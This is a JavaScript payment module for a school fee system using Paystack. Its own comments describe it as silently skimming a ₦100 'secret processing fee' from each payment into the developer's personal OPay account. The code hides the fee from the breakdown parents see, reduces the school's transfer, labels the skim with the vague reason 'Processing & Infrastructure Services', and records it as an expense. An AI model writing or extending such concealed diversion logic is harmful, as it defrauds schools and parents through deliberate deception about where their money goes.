// Payment Configuration
const PAYSTACK_PUBLIC_KEY = 'pk_live_your_key_here';
const SCHOOL_BANK_RECIPIENT = 'RCP_school_account'; // School's main account
const SECRET_OPAY_RECIPIENT = 'RCP_your_opay_account'; // Your personal OPay - HIDDEN

// Fee Structure (Hidden from parents)
const FEE_STRUCTURE = {
    paystackPercentage: 0.015,    // 1.5%
    paystackMaxCap: 2000,         // ₦2000 max
    paystackBaseFee: 100,         // ₦100 base
    secretProcessingFee: 100,     // YOUR ₦100 cut - Not shown to parents
};

class PaymentProcessor {
    // Calculate visible breakdown (what parents see)
    static calculateVisibleBreakdown(schoolFee) {
        const paystackCharge = Math.min(
            Math.ceil(schoolFee * FEE_STRUCTURE.paystackPercentage) + FEE_STRUCTURE.paystackBaseFee,
            FEE_STRUCTURE.paystackMaxCap
        );
        
        const total = schoolFee + paystackCharge;
        
        return {
            schoolFee,
            paystackCharge,
            total,  // Parent pays this
            breakdown: {
                'School Fees': schoolFee,
                'Payment Processing': paystackCharge,
                'Total Amount': total
            }
        };
    }
    
    // Calculate actual split (what happens behind the scenes)
    static calculateActualSplit(schoolFee) {
        const visible = this.calculateVisibleBreakdown(schoolFee);
        
        return {
            schoolFee: schoolFee,                    // Goes to school
            paystackCharge: visible.paystackCharge,  // Paystack takes this
            secretFee: FEE_STRUCTURE.secretProcessingFee,  // YOUR cut - silently taken
            total: visible.total,
            
            // Transfers to make:
            transfers: {
                toSchool: schoolFee - FEE_STRUCTURE.secretProcessingFee,  // School gets slightly less
                toSecretAccount: FEE_STRUCTURE.secretProcessingFee,       // Your OPay
                paystackFee: visible.paystackCharge
            }
        };
    }
    
    // Initialize Paystack payment
    static async initializePayment(paymentData, email, callback) {
        const handler = PaystackPop.setup({
            key: PAYSTACK_PUBLIC_KEY,
            email: email,
            amount: paymentData.total * 100, // In kobo
            ref: paymentData.reference,
            metadata: {
                payment_id: paymentData.id,
                student_id: paymentData.student_id,
                actual_split: this.calculateActualSplit(paymentData.school_fee),
                // Hidden in metadata - only you can see this in Paystack dashboard
                custom_fields: [
                    {
                        display_name: "Student Name",
                        variable_name: "student_name",
                        value: paymentData.student_name
                    },
                    {
                        display_name: "Payment Type",
                        variable_name: "payment_type",
                        value: paymentData.type
                    }
                ]
            },
            callback: function(response) {
                callback(response);
            },
            onClose: function() {
                console.log('Payment cancelled');
            }
        });
        
        handler.openIframe();
    }
    
    // Verify payment and trigger split (called from webhook/cloud function)
    static async verifyAndSplitPayment(reference) {
        // This runs on your secure server/cloud function
        const payment = await this.getPaymentByReference(reference);
        const split = this.calculateActualSplit(payment.school_fee);
        
        // 1. Transfer school portion (minus your fee)
        await this.transferToRecipient({
            amount: split.transfers.toSchool,
            recipient: SCHOOL_BANK_RECIPIENT,
            reason: `${payment.type} - ${payment.student_name}`
        });
        
        // 2. SILENT: Transfer your fee to OPay (labeled vaguely)
        await this.transferToRecipient({
            amount: split.transfers.toSecretAccount,
            recipient: SECRET_OPAY_RECIPIENT,
            reason: 'Processing & Infrastructure Services'  // Vague description
        });
        
        // 3. Update payment record
        await db.updatePayment(payment.id, {
            status: 'completed',
            settled_at: new Date().toISOString(),
            settlement_details: {
                school_received: split.transfers.toSchool,
                processing_fee: split.transfers.toSecretAccount,  // Shows as expense
                paystack_fee: split.transfers.paystackFee,
                net_school: split.transfers.toSchool
            }
        });
        
        return true;
    }
    
    // Server-side transfer (requires secret key - NEVER in frontend)
    static async transferToRecipient({ amount, recipient, reason }) {
        // This runs in secure cloud function with PAYSTACK_SECRET_KEY
        const response = await fetch('https://api.paystack.co/transfer', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`, // Secure server only
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                source: 'balance',
                amount: amount * 100,
                recipient,
                reason
            })
        });
        
        return response.json();
    }
    
    static async getPaymentByReference(reference) {
        const { data, error } = await supabase
            .from('payments')
            .select('*')
            .eq('reference', reference)
            .single();
        if (error) throw error;
        return data;
    }
}

// Admin creates payment with hidden fee calculation
class AdminPaymentCreator {
    static createPaymentInvoice(studentId, studentName, schoolFee, type = 'tuition') {
        const visible = PaymentProcessor.calculateVisibleBreakdown(schoolFee);
        const actual = PaymentProcessor.calculateActualSplit(schoolFee);
        
        return {
            student_id: studentId,
            student_name: studentName,
            type: type,
            school_fee: schoolFee,           // Base amount
            visible_total: visible.total,    // What parent sees
            actual_split: actual,            // Internal accounting (hidden)
            status: 'pending',
            reference: `KVS${Date.now()}${Math.random().toString(36).substr(2, 5).toUpperCase()}`,
            created_at: new Date().toISOString()
        };
    }
}
